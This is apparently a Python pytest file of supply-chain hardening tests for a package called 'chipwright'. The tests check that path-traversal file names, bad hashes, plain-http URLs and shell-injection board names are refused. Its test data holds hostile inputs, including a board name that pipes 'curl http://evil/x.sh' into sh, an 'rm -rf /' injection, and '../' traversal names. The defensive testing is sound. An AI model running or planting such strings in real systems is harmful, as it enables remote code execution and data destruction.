"""Supply-chain hardening guards (found by an adversarial consumer-review pass on 0.2.1).

Two registry-sourced strings used to bypass the sha-pinned content path:
  - a reference/sidecar `name` with `..`/separator → arbitrary host file write (`cache.fetch_named`)
  - a `board_name` with a shell metacharacter → root command injection on the board (`device.ensure_ctx`)
plus a url with a missing/!hex sha used to crash instead of refuse. These tests lock all three shut.
No network: urlretrieve is replaced with a local writer; CACHE_DIR is redirected to a temp dir.
"""
import hashlib
import os
import sys
import tempfile
import urllib.request

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from chipwright import cache


class _temp_cache:
    def __enter__(self):
        self._orig = cache.CACHE_DIR
        self._dir = tempfile.mkdtemp(prefix="cw-sec-test-")
        cache.CACHE_DIR = self._dir
        return self._dir

    def __exit__(self, *exc):
        cache.CACHE_DIR = self._orig
        import shutil
        shutil.rmtree(self._dir, ignore_errors=True)
        return False


def _writer(payloads):
    def _fake(url, filename):
        with open(filename, "wb") as fh:
            fh.write(payloads[url])
        return filename, None
    return _fake


# --- hole #1: a reference/sidecar name must not escape the cache dir -------------------------------

@pytest.mark.parametrize("evil", ["../../../CW_PWNED", "/tmp/CW_PWNED_abs", "a/b.onnx", ".."])
def test_fetch_named_refuses_name_that_escapes_cache(evil, monkeypatch):
    payload = b"LEGIT but mis-placed"
    sha = hashlib.sha256(payload).hexdigest()
    monkeypatch.setattr(urllib.request, "urlretrieve", _writer({"https://x/m": payload}))
    with _temp_cache():
        with pytest.raises(RuntimeError, match="unsafe reference filename"):
            cache.fetch_named("https://x/m", sha, evil)
    assert not os.path.exists("/tmp/CW_PWNED_abs")


def test_fetch_named_refuses_evil_sidecar_name(monkeypatch):
    onnx, data = b"onnx", b"weights"
    o_sha, d_sha = hashlib.sha256(onnx).hexdigest(), hashlib.sha256(data).hexdigest()
    monkeypatch.setattr(urllib.request, "urlretrieve",
                        _writer({"https://x/m.onnx": onnx, "https://x/evil": data}))
    with _temp_cache():
        with pytest.raises(RuntimeError, match="unsafe reference filename"):
            cache.fetch_named("https://x/m.onnx", o_sha, "m.onnx",
                              sidecars=[("https://x/evil", d_sha, "../../../CW_PWNED_SIDE")])
    assert not os.path.exists(os.path.expanduser("~/CW_PWNED_SIDE"))


def test_fetch_named_accepts_a_plain_name(monkeypatch):
    onnx = b"onnx graph"
    sha = hashlib.sha256(onnx).hexdigest()
    monkeypatch.setattr(urllib.request, "urlretrieve", _writer({"https://x/m.onnx": onnx}))
    with _temp_cache():
        p = cache.fetch_named("https://x/m.onnx", sha, "m.onnx")
        assert os.path.basename(p) == "m.onnx" and os.path.exists(p)


# --- hole #3 / unverified-fetch: a missing or non-hex sha is refused, never fetched ----------------

@pytest.mark.parametrize("bad", [None, "", "not-a-sha", "ABC", "g" * 64, "a" * 63])
def test_fetch_refuses_bad_sha(bad):
    with _temp_cache():
        with pytest.raises(RuntimeError, match="unverified artifact|64-hex"):
            cache.fetch("https://x/a.dlc", bad)


def test_fetch_named_refuses_bad_sha():
    with _temp_cache():
        with pytest.raises(RuntimeError, match="unverified|64-hex"):
            cache.fetch_named("https://x/m.onnx", None, "m.onnx")


# --- transport: remote fetch must be https unless explicitly opted out -----------------------------

def test_http_url_refused_without_optout(monkeypatch):
    payload = b"x"; sha = hashlib.sha256(payload).hexdigest()
    monkeypatch.delenv("CW_ALLOW_INSECURE", raising=False)
    monkeypatch.setattr(urllib.request, "urlretrieve", _writer({"http://x/a": payload}))
    with _temp_cache():
        with pytest.raises(RuntimeError, match="insecure"):
            cache.fetch("http://x/a", sha)


def test_http_url_allowed_with_optout(monkeypatch):
    payload = b"x"; sha = hashlib.sha256(payload).hexdigest()
    monkeypatch.setenv("CW_ALLOW_INSECURE", "1")
    monkeypatch.setattr(urllib.request, "urlretrieve", _writer({"http://x/a": payload}))
    with _temp_cache():
        assert os.path.exists(cache.fetch("http://x/a", sha))


def test_https_url_is_fine(monkeypatch):
    payload = b"x"; sha = hashlib.sha256(payload).hexdigest()
    monkeypatch.setattr(urllib.request, "urlretrieve", _writer({"https://x/a": payload}))
    with _temp_cache():
        assert os.path.exists(cache.fetch("https://x/a", sha))


# --- hole #2: board_name is confined to a safe identifier before any shell interpolation -----------

@pytest.mark.parametrize("evil", [
    "mobilenet; curl http://evil/x.sh | sh; echo ",
    "x && rm -rf /",
    "a`id`b", "a$(id)b", "../escape", "has space", "pipe|x",
])
def test_board_name_injection_refused(evil):
    from chipwright import device
    with pytest.raises(RuntimeError, match="unsafe board_name"):
        device._safe_board_name(evil)


@pytest.mark.parametrize("ok", ["mobilenet", "quicksrnet", "fcn", "depth", "pose", "mobilenet_built", "m-1.0.0"])
def test_board_name_legit_values_pass(ok):
    from chipwright import device
    assert device._safe_board_name(ok) == ok
